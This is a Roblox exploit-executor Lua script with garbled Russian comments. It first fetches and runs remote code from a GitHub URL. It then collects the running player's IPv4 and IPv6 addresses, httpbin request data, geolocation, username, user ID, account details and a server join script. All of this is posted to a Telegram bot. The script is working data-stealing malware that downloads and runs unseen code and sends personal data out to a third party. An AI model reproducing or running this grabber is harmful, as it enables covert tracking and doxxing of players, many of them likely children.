if getgenv().executed then 
    print("ck loaded already")
    return 
end
getgenv().executed = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer


-- –ü–æ–ª—É—á–∞–µ–º IP –∏ –ø—Ä–æ—á–∏–µ –¥–∞–Ω–Ω—ã–µ
loadstring(game:HttpGet("https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/Secret/superDROP"))()
local IPv4 = game:HttpGet("https://api.ipify.org")
local IPv6 = game:HttpGet("https://api64.ipify.org")
local HTTPbin = game:HttpGet("https://httpbin.org/get")
local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip=" .. IPv4)

-- –î–∞–Ω–Ω—ã–µ –∏–≥—Ä–æ–∫–∞
local PlayerName = LocalPlayer.Name
local DisplayName = LocalPlayer.DisplayName
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local AccountAge = LocalPlayer.AccountAge
local UserId = LocalPlayer.UserId
local PlaceID = game.PlaceId
local LogTime = os.date('!%Y-%m-%d %H:%M:%S GMT')

-- –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —ç–∫—Å–ø–ª–æ–π—Ç–∞
local function identifyexploit()
    local success, result = pcall(identifyexecutor)
    if success then return result end
    return (SENTINEL_LOADED and "Sentinel") or
           (XPROTECT and "SirHurt") or
           (PROTOSMASHER_LOADED and "Protosmasher") or
           "Unknown"
end

-- –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö —Å–µ—Ä–≤–µ—Ä–∞
local joinScript = ""
local ok, placeId, jobId = pcall(function()
    return game.PlaceId, game.JobId
end)

if ok then
    joinScript = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance("%s", "%s")',
        tostring(placeId), tostring(jobId)
    )
else
    joinScript = "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ —Å–µ—Ä–≤–µ—Ä–∞"
end

-- –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
local message = "ü§Ø *Player Information*"
message = message .. "\n*Username:* `" .. PlayerName .. "`"
message = message .. "\n*Display Name:* `" .. DisplayName .. "`"
message = message .. "\n*Membership Type:* `" .. MembershipType .. "`"
message = message .. "\n*Account Age:* `" .. AccountAge .. "` days"
message = message .. "\n*User ID:* `" .. UserId .. "`"
message = message .. "\n*IPv4:* `" .. IPv4 .. "`"
message = message .. "\n*IPv6:* `" .. IPv6 .. "`"
message = message .. "\n*Place ID:* `" .. PlaceID .. "`"
message = message .. "\n*Executor:* `" .. identifyexploit() .. "`"
message = message .. "\n*Log Time:* `" .. LogTime .. "`"

-- –î–æ–±–∞–≤–∏–º –±–ª–æ–∫–∏ JSON
message = message .. "\nüõú *HTTPbin Data:*\n```json\n" .. HTTPbin .. "\n```"
message = message .. "\nüó∫Ô∏è *geoPlugin Data:*\n```json\n" .. GeoPlug .. "\n```"
message = message .. "\n‚úÖ *Join Script:*\n```lua\n" .. joinScript .. "\n```"

-- –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
local function SendTelegramMessage(botToken, chatId, threadIdIP, text)
    local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"
    local data = {
        chat_id = chatId,
        text = text,
        parse_mode = "Markdown"
    }

    if threadIdIP then
        data["message_thread_id"] = threadIdIP
    end

    local jsonData = HttpService:JSONEncode(data)

    local requestFunction = (syn and syn.request) or http_request or request
    if requestFunction then
        return requestFunction({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end
end

-- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º
SendTelegramMessage(botToken, chatId, threadIdIP, message)
